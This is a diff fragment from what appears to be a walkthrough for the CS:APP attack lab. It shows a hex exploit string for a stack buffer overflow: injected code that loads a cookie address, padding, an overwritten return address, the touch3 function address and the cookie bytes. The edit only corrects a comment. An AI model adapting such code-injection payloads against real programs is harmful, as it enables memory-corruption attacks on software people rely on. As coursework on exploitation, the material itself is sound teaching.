@@ -35,7 +35,7 @@ Now, grab the bytes from the above code and start constructing your exploit stri
 48 c7 c7 00 0d 62 55 c3 /*rsp + 28 the address where the cookie is present*/
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 /*padding*/
-d8 0c 62 55 00 00 00 00 /* return address *
+d8 0c 62 55 00 00 00 00 /* return address ($rsp)*/
 7f 19 40 00 00 00 00 00 /* touch3 address -- get this from the rtarget dump file */
 34 33 34 62 34 62 37 30 /* cookie string*/
 ```
